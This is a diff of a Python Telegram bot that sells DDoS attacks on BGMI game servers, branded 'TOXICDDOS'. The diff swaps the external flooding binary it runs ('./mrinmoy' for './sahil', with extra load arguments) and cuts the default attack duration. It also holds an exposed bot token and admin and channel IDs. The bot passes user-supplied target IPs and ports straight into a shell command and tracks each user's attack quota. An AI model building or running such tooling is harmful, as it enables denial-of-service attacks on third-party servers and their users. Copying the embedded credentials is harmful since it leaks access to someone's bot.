@@ -8,7 +8,7 @@ from datetime import datetime, timedelta, timezone
 logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
 
 # Telegram bot token and channel ID
-TOKEN = '7885504979:AAGwRrIWAZNxcd1apzEJKN_X1oUgqqKQ0LI'  # Replace with your actual bot token
+TOKEN = '8079908290:AAEU8y5P4C19cchGq6gqwHr_7p7TWkPO9cI'  # Replace with your actual bot token
 ADMIN_IDS = [6882674372]  # Added new admin ID
 CHANNEL_ID = '-1002431196846' # Replace with your specific channel or group ID
 # Initialize the bot
@@ -373,7 +373,7 @@ def bgmi_command(message):
             user_cooldowns[user_id] = datetime.now() + timedelta(seconds=COOLDOWN_DURATION)
 
         # Notify that the attack will run for the default duration of 150 seconds, but display the input duration
-        default_duration = 150
+        default_duration = 120
         
         remaining_attacks = DAILY_ATTACK_LIMIT - user_attacks.get(user_id, 0)
         
@@ -395,7 +395,7 @@ def bgmi_command(message):
 
 async def run_attack_command_async(target_ip, target_port, duration, user_duration, user_name):
     try:
-        command = f"./mrinmoy {target_ip} {target_port} {duration}"
+        command = f"./sahil {target_ip} {target_port} {duration} 1000 100"
         process = await asyncio.create_subprocess_shell(command)
         await process.communicate()
         bot.send_message(CHANNEL_ID, f"🌊ѦƮṪ𝘼₡𝘒 ₡𝓞𝑀ℙLỄṪỄĎ🌊\n\n𝐓𝐀𝐑𝐆𝐄𝐓 -> {target_ip}\n𝐏𝐎𝐑𝐓 -> {target_port}  𝙛𝙞𝙣𝙞𝙨𝙝𝙚𝙙 ✅ \n[ 𝙊𝙧𝙞𝙜𝙞𝙣𝙖𝙡 𝙞𝙣𝙥𝙪𝙩: {user_duration} 𝙨𝙚𝙘𝙤𝙣𝙙𝙨.\n\n𝗧𝗵𝗮𝗻𝗸𝗬𝗼𝘂 𝗙𝗼𝗿 𝘂𝘀𝗶𝗻𝗴 𝗢𝘂𝗿 𝗦𝗲𝗿𝘃𝗶𝗰𝗲 <> TOXICDDOS")
